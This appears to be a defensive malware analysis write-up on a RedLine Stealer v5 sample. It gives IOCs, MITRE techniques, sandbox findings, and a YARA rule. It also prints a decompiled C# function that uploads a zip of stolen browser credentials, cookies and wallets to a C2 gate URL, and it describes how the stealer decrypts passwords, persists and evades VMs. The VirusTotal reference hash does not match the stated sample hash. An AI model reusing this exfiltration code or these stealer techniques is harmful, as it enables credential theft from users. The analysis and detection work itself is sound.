---
title: "RedLine Stealer v5 — Credential Harvesting via Fake Software Installers"
date: 2025-03-18
draft: false

malware_family: "RedLine / Win32"
platform: "Windows 10 x64"
severity: "critical"
weight: 1

tags:
  - stealer
  - loader

sha256: "a4cf69f849e9ea0ab4eba1cdc1ef2a973591bc7bb55901fdbceb412fb1147ef9"
md5: "0c4c442a43a9b18d2c45bf7c42d91812"

iocs:
  - type: "C2"
    value: "185.220.101[.]47:80"
  - type: "URL"
    value: "hxxp://185.220.101[.]47/gate.php"
  - type: "Mutex"
    value: "RDL_MUTEX_5Xk2pQ"
  - type: "Domain"
    value: "update-service[.]pro"

mitre:
  - id: "T1555.003"
    name: "Credentials from Web Browsers"
  - id: "T1082"
    name: "System Information Discovery"
  - id: "T1041"
    name: "Exfiltration Over C2 Channel"
  - id: "T1059.003"
    name: "Windows Command Shell"
---

## Executive Summary

RedLine Stealer v5 is a commodity credential-harvesting malware distributed through malvertising campaigns promoting fake software installers (notably cracked games and productivity tools). Upon execution, it extracts browser-saved passwords, cookies, cryptocurrency wallets, and Discord tokens before exfiltrating them to a C2 panel. This sample was built using the leaked RedLine builder and sold as MaaS (Malware-as-a-Service).

## Sample Information

| Field      | Value                          |
|------------|--------------------------------|
| File Name  | `AdobeInstaller_crack.exe`     |
| File Type  | PE32 executable (GUI)          |
| Size       | 612 KB                         |
| Compiler   | .NET 4.8                       |
| Packer     | ConfuserEx (obfuscation)       |
| First Seen | 2025-03-10 (VirusTotal)        |
| VT Score   | 47 / 72                        |

## Static Analysis

DIE (Detect-It-Easy) identified the sample as a .NET assembly with ConfuserEx obfuscation applied. PE-bear showed no obvious packing but the import table was minimal and consistent with .NET managed code.

Running `strings` revealed several interesting artifacts after de-obfuscating with de4dot:

```
gate.php
RDL_MUTEX_5Xk2pQ
SOFTWARE\Microsoft\Windows\CurrentVersion\Run
SELECT * FROM Win32_ComputerSystem
SELECT * FROM Win32_VideoController
\Google\Chrome\User Data\Default\Login Data
\Mozilla\Firefox\Profiles\
wallet.dat
```

The C2 URL was stored XOR-encoded with key `0x4A` and decoded at runtime.

## Dynamic Analysis

Executed inside a Windows 10 VM with FakeNet-NG intercepting traffic and Procmon logging all activity.

### Filesystem Activity

- Copied itself to `%APPDATA%\WindowsServices\svchost32.exe`
- Queried and staged browser databases to `%TEMP%\RDL_tmp\`
- Deleted temp folder after successful exfiltration

### Registry Activity

- Created persistence key: `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` → `svchost32`

### Network Activity

After a 3-second sleep (likely sandbox evasion), the sample sent an HTTP POST to `185.220.101[.]47/gate.php` with a zipped payload containing:

- `passwords.txt` — browser credentials
- `cookies.json` — session cookies
- `system_info.txt` — hostname, GPU, installed AV
- `wallets/` — any `.dat` files found

Traffic was unencrypted HTTP, making it easy to inspect with Wireshark.

## Code Analysis

After de-obfuscating with **de4dot**, the main stealer logic was clear. Key functions:

**Browser credential extraction** — uses SQLite to directly query `Login Data` from Chromium-based browsers. Passwords are decrypted using `CryptUnprotectData` (DPAPI).

**Crypto wallet scan** — enumerates `%APPDATA%` for known wallet paths (Exodus, Electrum, MetaMask extension storage).

**Anti-analysis checks** — checks `GetTickCount()` delta and presence of common VM artifacts (VBOX registry keys, `vmtoolsd.exe` process).

```csharp
// Decompiled: C2 communication
private static void SendReport(string zipPath) {
    var client = new WebClient();
    client.Headers.Add("User-Agent", "Mozilla/5.0");
    client.UploadFile("http://185.220.101[.]47/gate.php", zipPath);
}
```

## YARA Rule

```yara
rule RedLine_v5_ConfuserEx {
    meta:
        description = "Detects RedLine Stealer v5 with ConfuserEx obfuscation"
        author      = "analyst.lab"
        date        = "2025-03-18"
        severity    = "critical"

    strings:
        $mutex   = "RDL_MUTEX_" ascii wide
        $gate    = "gate.php" ascii wide
        $tmp_dir = "RDL_tmp" ascii wide
        $confuse = { 72 2A 00 00 70 }  // ConfuserEx runtime marker

    condition:
        uint16(0) == 0x5A4D and
        2 of ($mutex, $gate, $tmp_dir) and
        $confuse
}
```

## Conclusion

This RedLine v5 sample is a textbook commodity stealer — cheap to deploy, effective against average users, and trivial for defenders to detect once signatures exist. The ConfuserEx obfuscation is superficial and de4dot removes it completely. The unencrypted C2 channel is an operational security failure that makes traffic detection straightforward with a simple Snort rule.

The use of fake Adobe installers as a delivery vector points to a low-sophistication threat actor targeting home users, gamers, and piracy communities.

## References

- [VirusTotal Report](https://www.virustotal.com/gui/file/e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855)
- [RedLine Stealer — malpedia](https://malpedia.caad.fkie.fraunhofer.de/details/win.redline_stealer)
- [MITRE ATT&CK T1555.003](https://attack.mitre.org/techniques/T1555/003/)
- [de4dot — .NET deobfuscator](https://github.com/de4dot/de4dot)
